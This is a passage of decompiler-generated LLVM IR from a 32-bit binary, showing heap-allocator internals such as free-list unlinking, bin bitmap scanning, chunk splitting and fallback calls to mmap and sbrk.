  %v3_804c197 = load i32, i32* %v2_804c197, align 4
  store i32 %v3_804c197, i32* @edx, align 4
  %v1_804c19a = add i32 %v3_804c197, 12
  %v2_804c19a = inttoptr i32 %v1_804c19a to i32*
  %v3_804c19a = load i32, i32* %v2_804c19a, align 4
  %v15_804c19a = icmp eq i32 %v3_804c19a, %v4_804c19f
  %v1_804c19d = icmp eq i1 %v15_804c19a, false
  br i1 %v1_804c19d, label %dec_label_pc_804c1a4, label %dec_label_pc_804c19f

dec_label_pc_804c19f:                             ; preds = %dec_label_pc_804c197
  %v1_804c19f = add i32 %v3_804c18b, 8
  %v2_804c19f = inttoptr i32 %v1_804c19f to i32*
  %v3_804c19f = load i32, i32* %v2_804c19f, align 4
  %v15_804c19f = icmp eq i32 %v3_804c19f, %v4_804c19f
  br i1 %v15_804c19f, label %dec_label_pc_804c1a9, label %dec_label_pc_804c1a4

dec_label_pc_804c1a4:                             ; preds = %dec_label_pc_804c19f, %dec_label_pc_804c197
  %v0_804c1a4 = call i32 @abort()
  store i32 %v0_804c1a4, i32* %eax.global-to-local, align 4
  %v0_804c1a9.pre = load i32, i32* @ebx, align 4
  %v0_804c1af.pre = load i32, i32* @ecx, align 4
  %v1_804c1af.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c1a9

dec_label_pc_804c1a9:                             ; preds = %dec_label_pc_804c19f, %dec_label_pc_804c1a4
  %v1_804c1af = phi i32 [ %v3_804c197, %dec_label_pc_804c19f ], [ %v1_804c1af.pre, %dec_label_pc_804c1a4 ]
  %v0_804c1af = phi i32 [ %v3_804c18b, %dec_label_pc_804c19f ], [ %v0_804c1af.pre, %dec_label_pc_804c1a4 ]
  %v0_804c1a9 = phi i32 [ %v1_804c18e, %dec_label_pc_804c19f ], [ %v0_804c1a9.pre, %dec_label_pc_804c1a4 ]
  %v5_804c1ab = sub i32 %v0_804c1a9, %v1_804c372
  store i32 %v5_804c1ab, i32* %esi.global-to-local, align 4
  %v2_804c1af = add i32 %v1_804c1af, 12
  %v3_804c1af = inttoptr i32 %v2_804c1af to i32*
  store i32 %v0_804c1af, i32* %v3_804c1af, align 4
  %v0_804c1b2 = load i32, i32* @edx, align 4
  %v1_804c1b2 = load i32, i32* @ecx, align 4
  %v2_804c1b2 = add i32 %v1_804c1b2, 8
  %v3_804c1b2 = inttoptr i32 %v2_804c1b2 to i32*
  store i32 %v0_804c1b2, i32* %v3_804c1b2, align 4
  %v0_804c1b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1b5 = add i32 %v0_804c1b5, 8
  store i32 %v1_804c1b5, i32* @ecx, align 4
  %v0_804c1b8 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_804c1b8, 16
  br i1 %tmp137, label %dec_label_pc_804c6e7, label %dec_label_pc_804c1c1

dec_label_pc_804c1c1:                             ; preds = %dec_label_pc_804c1a9
  %v2_804c1c5 = add i32 %v0_804c1b5, %v1_804c372
  store i32 %v2_804c1c5, i32* @edx, align 4
  %v1_804c1c8 = or i32 %v1_804c372, 1
  store i32 %v1_804c1c8, i32* %ebx.global-to-local, align 4
  %v2_804c1cb = add i32 %v0_804c1b5, 4
  %v3_804c1cb = inttoptr i32 %v2_804c1cb to i32*
  store i32 %v1_804c1c8, i32* %v3_804c1cb, align 4
  %v0_804c1ce = load i32, i32* %esi.global-to-local, align 4
  %v1_804c1d0 = or i32 %v0_804c1ce, 1
  store i32 %v1_804c1d0, i32* %eax.global-to-local, align 4
  %v0_804c1d3 = load i32, i32* @edx, align 4
  %v1_804c1d3 = load i32, i32* @ebp, align 4
  %v2_804c1d3 = add i32 %v1_804c1d3, 8
  %v3_804c1d3 = inttoptr i32 %v2_804c1d3 to i32*
  store i32 %v0_804c1d3, i32* %v3_804c1d3, align 4
  %v0_804c1d6 = load i32, i32* @edx, align 4
  %v1_804c1d6 = load i32, i32* @ebp, align 4
  %v2_804c1d6 = add i32 %v1_804c1d6, 12
  %v3_804c1d6 = inttoptr i32 %v2_804c1d6 to i32*
  store i32 %v0_804c1d6, i32* %v3_804c1d6, align 4
  %v0_804c1d9 = load i32, i32* @edx, align 4
  %v1_804c1d9 = add i32 %v0_804c1d9, 8
  %v2_804c1d9 = inttoptr i32 %v1_804c1d9 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c1d9, align 4
  %v0_804c1e0 = load i32, i32* @edx, align 4
  %v1_804c1e0 = add i32 %v0_804c1e0, 12
  %v2_804c1e0 = inttoptr i32 %v1_804c1e0 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c1e0, align 4
  %v0_804c1e7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1e7 = load i32, i32* @edx, align 4
  %v2_804c1e7 = add i32 %v1_804c1e7, 4
  %v3_804c1e7 = inttoptr i32 %v2_804c1e7 to i32*
  store i32 %v0_804c1e7, i32* %v3_804c1e7, align 4
  %v0_804c1ea = load i32, i32* %esi.global-to-local, align 4
  %v1_804c1ea = load i32, i32* @edx, align 4
  %v3_804c1ea = add i32 %v1_804c1ea, %v0_804c1ea
  %v4_804c1ea = inttoptr i32 %v3_804c1ea to i32*
  store i32 %v0_804c1ea, i32* %v4_804c1ea, align 4
  br label %dec_label_pc_804c6ec

dec_label_pc_804c1f4:                             ; preds = %dec_label_pc_804c188, %dec_label_pc_804c178
  %v4_804c19f = phi i32 [ %storemerge1.pre, %dec_label_pc_804c178 ], [ %v3_804c18b, %dec_label_pc_804c188 ]
  store i32 %v4_804c19f, i32* %eax.global-to-local, align 4
  %v12_804c1f4 = icmp eq i32 %v4_804c19f, %v2_804c17c
  %v1_804c1f6 = icmp eq i1 %v12_804c1f4, false
  br i1 %v1_804c1f6, label %dec_label_pc_804c188, label %dec_label_pc_804c1f8.loopexit

dec_label_pc_804c1f8.loopexit:                    ; preds = %dec_label_pc_804c1f4
  br label %dec_label_pc_804c1f8

dec_label_pc_804c1f8:                             ; preds = %dec_label_pc_804c1f8.loopexit, %dec_label_pc_804c16a
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804c201 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804c201, i32* %ecx.global-to-local, align 4
  %v2_804c204 = udiv i32 %v1_804c201, 32
  store i32 %v2_804c204, i32* @edi, align 4
  %v1_804c207 = mul nuw nsw i32 %v2_804c204, 4
  %v2_804c207 = add i32 %v1_804c207, ptrtoint (i32* @global_var_8056174.347 to i32)
  %v3_804c207 = inttoptr i32 %v2_804c207 to i32*
  %v4_804c207 = load i32, i32* %v3_804c207, align 4
  store i32 %v4_804c207, i32* %edx.global-to-local, align 4
  %v1_804c20e = mul i32 %v1_804c201, 8
  %v2_804c20e = add i32 %v1_804c20e, ptrtoint (i32* @global_var_8055e6c.343 to i32)
  store i32 %v2_804c20e, i32* %ebx.global-to-local, align 4
  %v1_804c215 = urem i32 %v1_804c201, 32
  %v2_804c215 = icmp eq i32 %v1_804c215, 0
  store i32 %v1_804c215, i32* %ecx.global-to-local, align 4
  br i1 %v2_804c215, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804c1f8
  %v5_804c218 = shl i32 1, %v1_804c215
  store i32 %v5_804c218, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804c1f8, %bb83, %dec_label_pc_804c259
  %v1_804c21a = phi i32 [ %v1_804c21a.pre, %dec_label_pc_804c259 ], [ %v4_804c207, %bb83 ], [ %v4_804c207, %dec_label_pc_804c1f8 ]
  %v0_804c21e = phi i32 [ %v0_804c21a.pre, %dec_label_pc_804c259 ], [ %v5_804c218, %bb83 ], [ 1, %dec_label_pc_804c1f8 ]
  %tmp84 = icmp ule i32 %v0_804c21e, %v1_804c21a
  %v1_804c21e = icmp eq i32 %v0_804c21e, 0
  %v1_804c220 = icmp eq i1 %v1_804c21e, false
  %or.cond = and i1 %tmp84, %v1_804c220
  br i1 %or.cond, label %dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge, label %dec_label_pc_804c222.preheader

dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge: ; preds = %.preheader
  %v0_804c24912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c24e.preheader

dec_label_pc_804c222.preheader:                   ; preds = %.preheader
  %v0_804c222.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c222

dec_label_pc_804c222:                             ; preds = %dec_label_pc_804c222.preheader, %dec_label_pc_804c22c
  %v0_804c222 = phi i32 [ %v0_804c222.pre, %dec_label_pc_804c222.preheader ], [ %v1_804c222, %dec_label_pc_804c22c ]
  %v1_804c222 = add i32 %v0_804c222, 1
  store i32 %v1_804c222, i32* @edi, align 4
  %v6_804c226 = icmp ugt i32 %v1_804c222, 2
  br i1 %v6_804c226, label %dec_label_pc_804c2dd.loopexit, label %dec_label_pc_804c22c

dec_label_pc_804c22c:                             ; preds = %dec_label_pc_804c222
  %v1_804c22c = mul i32 %v1_804c222, 4
  %v2_804c22c = add i32 %v1_804c22c, ptrtoint (i32* @global_var_8056174.347 to i32)
  %v3_804c22c = inttoptr i32 %v2_804c22c to i32*
  %v4_804c22c = load i32, i32* %v3_804c22c, align 4
  store i32 %v4_804c22c, i32* %edx.global-to-local, align 4
  %v1_804c233 = icmp eq i32 %v4_804c22c, 0
  br i1 %v1_804c233, label %dec_label_pc_804c222, label %dec_label_pc_804c237

dec_label_pc_804c237:                             ; preds = %dec_label_pc_804c22c
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804c23e = mul i32 %v1_804c222, 256
  store i32 %v2_804c23e, i32* %eax.global-to-local, align 4
  %v1_804c241 = add i32 %v2_804c23e, ptrtoint (i32* @global_var_8055e6c.343 to i32)
  store i32 %v1_804c241, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c24e.preheader

dec_label_pc_804c24e.preheader:                   ; preds = %dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge, %dec_label_pc_804c237
  %v0_804c24912 = phi i32 [ %v1_804c241, %dec_label_pc_804c237 ], [ %v0_804c24912.pre, %dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804c237 ], [ %v0_804c21e, %dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge ]
  %v0_804c25f = phi i32 [ %v4_804c22c, %dec_label_pc_804c237 ], [ %v1_804c21a, %dec_label_pc_804c21e.dec_label_pc_804c24e.preheader_crit_edge ]
  %v2_804c24e4 = and i32 %v0_804c25f, %esi.promoted
  %v3_804c24e5 = icmp eq i32 %v2_804c24e4, 0
  br i1 %v3_804c24e5, label %dec_label_pc_804c249, label %dec_label_pc_804c252

dec_label_pc_804c249:                             ; preds = %dec_label_pc_804c24e.preheader, %dec_label_pc_804c249
  %v2_804c24c14 = phi i32 [ %v2_804c24c, %dec_label_pc_804c249 ], [ %esi.promoted, %dec_label_pc_804c24e.preheader ]
  %v0_804c24913 = phi i32 [ %v1_804c249, %dec_label_pc_804c249 ], [ %v0_804c24912, %dec_label_pc_804c24e.preheader ]
  %v1_804c249 = add i32 %v0_804c24913, 8
  %v2_804c24c = mul i32 %v2_804c24c14, 2
  %v2_804c24e = and i32 %v2_804c24c, %v0_804c25f
  %v3_804c24e = icmp eq i32 %v2_804c24e, 0
  br i1 %v3_804c24e, label %dec_label_pc_804c249, label %dec_label_pc_804c24e.dec_label_pc_804c252_crit_edge

dec_label_pc_804c24e.dec_label_pc_804c252_crit_edge: ; preds = %dec_label_pc_804c249
  store i32 %v1_804c249, i32* %ebx.global-to-local, align 4
  store i32 %v2_804c24c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c252

dec_label_pc_804c252:                             ; preds = %dec_label_pc_804c24e.dec_label_pc_804c252_crit_edge, %dec_label_pc_804c24e.preheader
  %v0_804c259 = phi i32 [ %v2_804c24c, %dec_label_pc_804c24e.dec_label_pc_804c252_crit_edge ], [ %esi.promoted, %dec_label_pc_804c24e.preheader ]
  %v1_804c27c = phi i32 [ %v1_804c249, %dec_label_pc_804c24e.dec_label_pc_804c252_crit_edge ], [ %v0_804c24912, %dec_label_pc_804c24e.preheader ]
  %v1_804c252 = add i32 %v1_804c27c, 12
  %v2_804c252 = inttoptr i32 %v1_804c252 to i32*
  %v3_804c252 = load i32, i32* %v2_804c252, align 4
  store i32 %v3_804c252, i32* @ecx, align 4
  %v12_804c255 = icmp eq i32 %v3_804c252, %v1_804c27c
  %v1_804c257 = icmp eq i1 %v12_804c255, false
  br i1 %v1_804c257, label %dec_label_pc_804c26d, label %dec_label_pc_804c259

dec_label_pc_804c259:                             ; preds = %dec_label_pc_804c252
  %v2_804c25b = mul i32 %v0_804c259, 2
  store i32 %v2_804c25b, i32* %esi.global-to-local, align 4
  %v1_804c25d = sub i32 -1, %v0_804c259
  store i32 %v1_804c25d, i32* %eax.global-to-local, align 4
  %v2_804c25f = and i32 %v0_804c25f, %v1_804c25d
  store i32 %v2_804c25f, i32* %edx.global-to-local, align 4
  %v1_804c261 = add i32 %v3_804c252, 8
  store i32 %v1_804c261, i32* %ebx.global-to-local, align 4
  %v1_804c264 = load i32, i32* @edi, align 4
  %v2_804c264 = mul i32 %v1_804c264, 4
  %v3_804c264 = add i32 %v2_804c264, ptrtoint (i32* @global_var_8056174.347 to i32)
  %v4_804c264 = inttoptr i32 %v3_804c264 to i32*
  store i32 %v2_804c25f, i32* %v4_804c264, align 4
  %v0_804c21a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c21a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804c26d:                             ; preds = %dec_label_pc_804c252
  %v1_804c26d = add i32 %v3_804c252, 4
  %v2_804c26d = inttoptr i32 %v1_804c26d to i32*
  %v3_804c26d = load i32, i32* %v2_804c26d, align 4
  store i32 %v3_804c26d, i32* %edx.global-to-local, align 4
  %v1_804c270 = add i32 %v3_804c252, 12
  %v2_804c270 = inttoptr i32 %v1_804c270 to i32*
  %v3_804c270 = load i32, i32* %v2_804c270, align 4
  store i32 %v3_804c270, i32* %eax.global-to-local, align 4
  %v1_804c273 = and i32 %v3_804c26d, -4
  store i32 %v1_804c273, i32* @edx, align 4
  %v5_804c278 = sub i32 %v1_804c273, %v1_804c372
  store i32 %v5_804c278, i32* %esi.global-to-local, align 4
  store i32 %v3_804c270, i32* %v2_804c252, align 4
  %v0_804c27f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c27f = load i32, i32* %eax.global-to-local, align 4
  %v2_804c27f = add i32 %v1_804c27f, 8
  %v3_804c27f = inttoptr i32 %v2_804c27f to i32*
  store i32 %v0_804c27f, i32* %v3_804c27f, align 4
  %v0_804c282 = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_804c282, 16
  %v0_804c287 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_804c287, label %dec_label_pc_804c28e

dec_label_pc_804c287:                             ; preds = %dec_label_pc_804c26d
  %v1_804c287 = load i32, i32* @edx, align 4
  %v2_804c287 = add i32 %v0_804c287, 4
  %v3_804c287 = add i32 %v2_804c287, %v1_804c287
  %v4_804c287 = inttoptr i32 %v3_804c287 to i32*
  %v5_804c287 = load i32, i32* %v4_804c287, align 4
  %v6_804c287 = or i32 %v5_804c287, 1
  store i32 %v6_804c287, i32* %v4_804c287, align 4
  br label %dec_label_pc_804c2d5

dec_label_pc_804c28e:                             ; preds = %dec_label_pc_804c26d
  %v2_804c292 = add i32 %v0_804c287, %v1_804c372
  store i32 %v2_804c292, i32* %eax.global-to-local, align 4
  %v1_804c29b = load i32, i32* @ebp, align 4
  %v2_804c29b = add i32 %v1_804c29b, 8
  %v3_804c29b = inttoptr i32 %v2_804c29b to i32*
  store i32 %v2_804c292, i32* %v3_804c29b, align 4
  %v0_804c29e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c29e = load i32, i32* @ebp, align 4
  %v2_804c29e = add i32 %v1_804c29e, 12
  %v3_804c29e = inttoptr i32 %v2_804c29e to i32*
  store i32 %v0_804c29e, i32* %v3_804c29e, align 4
  %v0_804c2a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c2a1 = add i32 %v0_804c2a1, 8
  %v2_804c2a1 = inttoptr i32 %v1_804c2a1 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c2a1, align 4
  %v0_804c2a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c2a8 = add i32 %v0_804c2a8, 12
  %v2_804c2a8 = inttoptr i32 %v1_804c2a8 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804c2a8, align 4
  %v0_804c2af = load i32, i32* @global_var_8055e70.344, align 16
  %v4_804c2b5 = load i32, i32* %eax.global-to-local, align 4
  %v5_804c2b5 = select i1 %v8_804c01b, i32 %v4_804c2b5, i32 %v0_804c2af
  %v4_804c2b8 = or i32 %v1_804c372, 1
  store i32 %v5_804c2b5, i32* @global_var_8055e70.344, align 16
  %v0_804c2c3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804c2b8, i32* %ebx.global-to-local, align 4
  %v1_804c2c9 = or i32 %v0_804c2c3, 1
  store i32 %v1_804c2c9, i32* @edx, align 4
  %v3_804c2cc = add i32 %v0_804c2c3, %v4_804c2b5
  %v4_804c2cc = inttoptr i32 %v3_804c2cc to i32*
  store i32 %v0_804c2c3, i32* %v4_804c2cc, align 4
  %v0_804c2cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c2cf = load i32, i32* @ecx, align 4
  %v2_804c2cf = add i32 %v1_804c2cf, 4
  %v3_804c2cf = inttoptr i32 %v2_804c2cf to i32*
  store i32 %v0_804c2cf, i32* %v3_804c2cf, align 4
  %v0_804c2d2 = load i32, i32* @edx, align 4
  %v1_804c2d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2d2 = add i32 %v1_804c2d2, 4
  %v3_804c2d2 = inttoptr i32 %v2_804c2d2 to i32*
  store i32 %v0_804c2d2, i32* %v3_804c2d2, align 4
  br label %dec_label_pc_804c2d5

dec_label_pc_804c2d5:                             ; preds = %dec_label_pc_804c3c9, %dec_label_pc_804c287, %dec_label_pc_804c28e
  %v0_804c2d5 = load i32, i32* @ecx, align 4
  %v1_804c2d5 = add i32 %v0_804c2d5, 8
  store i32 %v1_804c2d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c2dd.loopexit:                    ; preds = %dec_label_pc_804c222
  br label %dec_label_pc_804c2dd

dec_label_pc_804c2dd:                             ; preds = %dec_label_pc_804c2dd.loopexit, %dec_label_pc_804bfdd, %dec_label_pc_804bfe5
  %v0_804c2dd = load i32, i32* @global_var_8055e6c.343, align 4
  store i32 %v0_804c2dd, i32* @ebx, align 4
  store i32 %v1_804c372, i32* %esi.global-to-local, align 4
  %v1_804c2e7 = add i32 %v0_804c2dd, 4
  %v2_804c2e7 = inttoptr i32 %v1_804c2e7 to i32*
  %v3_804c2e7 = load i32, i32* %v2_804c2e7, align 4
  %v1_804c2ea = add i32 %v1_804c372, 16
  store i32 %v1_804c2ea, i32* @esi, align 4
  %v1_804c2f1 = and i32 %v3_804c2e7, -4
  store i32 %v1_804c2f1, i32* %ecx.global-to-local, align 4
  %v7_804c2f4 = icmp ult i32 %v1_804c2f1, %v1_804c2ea
  br i1 %v7_804c2f4, label %dec_label_pc_804c314, label %dec_label_pc_804c2f8

dec_label_pc_804c2f8:                             ; preds = %dec_label_pc_804c2dd
  %v2_804c2fc = add i32 %v0_804c2dd, %v1_804c372
  store i32 %v2_804c2fc, i32* @edx, align 4
  %v1_804c2ff = or i32 %v1_804c372, 1
  store i32 %v1_804c2ff, i32* %eax.global-to-local, align 4
  store i32 %v2_804c2fc, i32* @global_var_8055e6c.343, align 4
  store i32 %v1_804c2ff, i32* %v2_804c2e7, align 4
  %v0_804c30b = load i32, i32* %ecx.global-to-local, align 4
  %v5_804c30b = sub i32 %v0_804c30b, %v1_804c372
  store i32 %v5_804c30b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c68d

dec_label_pc_804c314:                             ; preds = %dec_label_pc_804c2dd
  %v0_804c314 = load i8, i8* @global_var_8055e40.342, align 64
  %v1_804c314 = and i8 %v0_804c314, 2
  %v2_804c314 = icmp eq i8 %v1_804c314, 0
  %v0_804c31b = load i32, i32* @global_var_805619c.348, align 4
  store i32 %v0_804c31b, i32* %edx.global-to-local, align 4
  br i1 %v2_804c314, label %dec_label_pc_804c348, label %dec_label_pc_804c323

dec_label_pc_804c323:                             ; preds = %dec_label_pc_804c314
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804c32b = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055e40.342 to i32*))
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* @ebx, align 4
  %v1_804c335 = add i32 %v1_804c372, -7
  store i32 %v1_804c335, i32* %eax.global-to-local, align 4
  store i32 %v1_804c335, i32* %stack_var_-92, align 4
  %v1_804c339 = call i32 @malloc(i32 %v1_804c335)
  store i32 %v1_804c339, i32* %eax.global-to-local, align 4
  store i32 %v1_804c339, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6fd

dec_label_pc_804c348:                             ; preds = %dec_label_pc_804c314
  store i32 %v1_804c372, i32* @ebx, align 4
  %v1_804c34c = add i32 %v0_804c31b, -1
  store i32 %v1_804c34c, i32* @ecx, align 4
  %v1_804c34f = load i32, i32* @global_var_805618c.349, align 4
  %v7_804c34f = icmp ult i32 %v1_804c372, %v1_804c34f
  br i1 %v7_804c34f, label %dec_label_pc_804c42a, label %dec_label_pc_804c35f

dec_label_pc_804c35f:                             ; preds = %dec_label_pc_804c348
  %v0_804c35f = load i32, i32* @global_var_8056190.350, align 16
  store i32 %v0_804c35f, i32* %eax.global-to-local, align 4
  %v1_804c364 = load i32, i32* @global_var_8056194.351, align 4
  %v5_804c36a = icmp slt i32 %v0_804c35f, %v1_804c364
  br i1 %v5_804c36a, label %dec_label_pc_804c370, label %dec_label_pc_804c42a

dec_label_pc_804c370:                             ; preds = %dec_label_pc_804c35f
  %v2_804c372 = add i32 %v1_804c372, 10
  %v3_804c372 = add i32 %v2_804c372, %v0_804c31b
  %v1_804c376 = sub i32 0, %v0_804c31b
  store i32 %v1_804c376, i32* %eax.global-to-local, align 4
  %v2_804c378 = and i32 %v3_804c372, %v1_804c376
  store i32 %v2_804c378, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_804c378, %v1_804c372
  br i1 %tmp139, label %dec_label_pc_804c384, label %dec_label_pc_804c42a

dec_label_pc_804c384:                             ; preds = %dec_label_pc_804c370
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804c391 = call i32 @mmap(i32 0, i32 %v2_804c378, i32 3, i32 34, i32 0, i32 0, i32 %v1_804c34c, i32 %v1_804c34c)
  store i32 %v8_804c391, i32* %eax.global-to-local, align 4
  %v10_804c399 = icmp eq i32 %v8_804c391, -1
  store i32 %v8_804c391, i32* %edx.global-to-local, align 4
  br i1 %v10_804c399, label %dec_label_pc_804c384.dec_label_pc_804c42a_crit_edge, label %dec_label_pc_804c3a4

dec_label_pc_804c384.dec_label_pc_804c42a_crit_edge: ; preds = %dec_label_pc_804c384
  %v0_804c42a.pre = load i32, i32* @global_var_8055e6c.343, align 4
  br label %dec_label_pc_804c42a

dec_label_pc_804c3a4:                             ; preds = %dec_label_pc_804c384
  %v1_804c3a6 = urem i32 %v8_804c391, 8
  %v2_804c3a6 = icmp eq i32 %v1_804c3a6, 0
  store i32 %v1_804c3a6, i32* %ecx.global-to-local, align 4
  br i1 %v2_804c3a6, label %dec_label_pc_804c3bf, label %dec_label_pc_804c3ab

dec_label_pc_804c3ab:                             ; preds = %dec_label_pc_804c3a4
  %v0_804c3b0 = load i32, i32* @ebx, align 4
  %v2_804c3b2 = sub nsw i32 8, %v1_804c3a6
  store i32 %v2_804c3b2, i32* %eax.global-to-local, align 4
  %v2_804c3b4 = add i32 %v2_804c3b2, %v8_804c391
  store i32 %v2_804c3b4, i32* @ecx, align 4
  %v2_804c3b7 = sub i32 %v0_804c3b0, %v2_804c3b2
  store i32 %v2_804c3b7, i32* %esi.global-to-local, align 4
  %v2_804c3b9 = inttoptr i32 %v2_804c3b4 to i32*
  store i32 %v2_804c3b2, i32* %v2_804c3b9, align 4
  br label %dec_label_pc_804c3c9

dec_label_pc_804c3bf:                             ; preds = %dec_label_pc_804c3a4
  store i32 %v8_804c391, i32* @ecx, align 4
  %v1_804c3c1 = inttoptr i32 %v8_804c391 to i32*
  store i32 0, i32* %v1_804c3c1, align 4
  br label %dec_label_pc_804c3c9

dec_label_pc_804c3c9:                             ; preds = %dec_label_pc_804c3ab, %dec_label_pc_804c3bf
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804c3ab ], [ @ebx, %dec_label_pc_804c3bf ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804c3c9 = or i32 %storemerge, 2
  %v1_804c3cc = load i32, i32* @ecx, align 4
  %v2_804c3cc = add i32 %v1_804c3cc, 4
  %v3_804c3cc = inttoptr i32 %v2_804c3cc to i32*
  store i32 %v1_804c3c9, i32* %v3_804c3cc, align 4
  %v0_804c3cf = load i32, i32* @global_var_8056190.350, align 16
  %v0_804c3d4 = load i32, i32* @global_var_80561b0.352, align 16
  %v1_804c3da = add i32 %v0_804c3cf, 1
  %v1_804c3db = load i32, i32* @global_var_8056198.353, align 8
  %v2_804c3db = sub i32 %v1_804c3da, %v1_804c3db
  %v8_804c3db = xor i32 %v1_804c3db, %v1_804c3da
  %v9_804c3db = xor i32 %v2_804c3db, %v1_804c3da
  %v10_804c3db = and i32 %v9_804c3db, %v8_804c3db
  %v11_804c3db = icmp slt i32 %v10_804c3db, 0
  %v12_804c3db = icmp eq i32 %v2_804c3db, 0
  %v13_804c3db = icmp slt i32 %v2_804c3db, 0
  store i32 %v1_804c3da, i32* @global_var_8056190.350, align 16
  %v3_804c3e6 = icmp ne i1 %v13_804c3db, %v11_804c3db
  %v4_804c3e6 = or i1 %v12_804c3db, %v3_804c3e6
  %v7_804c3e6 = select i1 %v4_804c3e6, i32 %v1_804c3db, i32 %v1_804c3da
  store i32 %v7_804c3e6, i32* @global_var_8056198.353, align 8
  %v0_804c3f2 = load i32, i32* @global_var_80561a4.354, align 4
  %v1_804c3f7 = load i32, i32* @ebx, align 4
  %v2_804c3f7 = add i32 %v1_804c3f7, %v0_804c3f2
  store i32 %v2_804c3f7, i32* @global_var_80561a4.354, align 4
  %tmp86 = icmp ule i32 %v2_804c3f7, %v0_804c3d4
  %v5_804c404 = select i1 %tmp86, i32 %v0_804c3d4, i32 %v2_804c3f7
  store i32 %v5_804c404, i32* @edx, align 4
  %v1_804c407 = load i32, i32* @global_var_80561a8.355, align 8
  %v2_804c407 = add i32 %v1_804c407, %v2_804c3f7
  store i32 %v5_804c404, i32* @global_var_80561b0.352, align 16
  %v1_804c413 = load i32, i32* @global_var_80561b4.356, align 4
  %tmp140 = icmp ule i32 %v2_804c407, %v1_804c413
  %v5_804c419 = select i1 %tmp140, i32 %v1_804c413, i32 %v2_804c407
  store i32 %v5_804c419, i32* %eax.global-to-local, align 4
  store i32 %v5_804c419, i32* @global_var_80561b4.356, align 4
  br label %dec_label_pc_804c2d5

dec_label_pc_804c42a:                             ; preds = %dec_label_pc_804c370, %dec_label_pc_804c384.dec_label_pc_804c42a_crit_edge, %dec_label_pc_804c35f, %dec_label_pc_804c348
  %v0_804c42a = phi i32 [ %v0_804c42a.pre, %dec_label_pc_804c384.dec_label_pc_804c42a_crit_edge ], [ %v0_804c2dd, %dec_label_pc_804c35f ], [ %v0_804c2dd, %dec_label_pc_804c370 ], [ %v0_804c2dd, %dec_label_pc_804c348 ]
  store i32 %v0_804c42a, i32* %eax.global-to-local, align 4
  %v1_804c433 = add i32 %v0_804c42a, 4
  %v2_804c433 = inttoptr i32 %v1_804c433 to i32*
  %v3_804c433 = load i32, i32* %v2_804c433, align 4
  %v1_804c43a = and i32 %v3_804c433, -4
  %v2_804c43a = icmp eq i32 %v1_804c43a, 0
  store i32 %v1_804c43a, i32* @ebp, align 4
  %v1_804c440 = load i32, i32* @global_var_8056188.357, align 8
  %v0_804c44a = load i8, i8* @global_var_80561a0.358, align 32
  %v1_804c44a = urem i8 %v0_804c44a, 2
  %v2_804c44a = icmp eq i8 %v1_804c44a, 0
  %v1_804c451 = icmp eq i1 %v2_804c44a, false
  %v1_804c43a.op = sub i32 0, %v1_804c43a
  %v2_804c448.neg = select i1 %v1_804c451, i32 %v1_804c43a.op, i32 0
  %v2_804c440 = add i32 %v1_804c34c, %v1_804c2ea
  %v4_804c451 = add i32 %v2_804c440, %v1_804c440
  %v5_804c458 = add i32 %v4_804c451, %v2_804c448.neg
  store i32 %v5_804c458, i32* %eax.global-to-local, align 4
  %v1_804c45c = sub i32 0, %v0_804c31b
  store i32 %v1_804c45c, i32* @edx, align 4
  %v2_804c460 = and i32 %v5_804c458, %v1_804c45c
  store i32 %v2_804c460, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_804c460, 1
  br i1 %tmp87, label %dec_label_pc_804c47e, label %dec_label_pc_804c468

dec_label_pc_804c468:                             ; preds = %dec_label_pc_804c42a
  store i32 %v2_804c460, i32* %stack_var_-92, align 4
  %v1_804c46c = call i32 @__GI_sbrk(i32 %v2_804c460)
  store i32 %v1_804c46c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
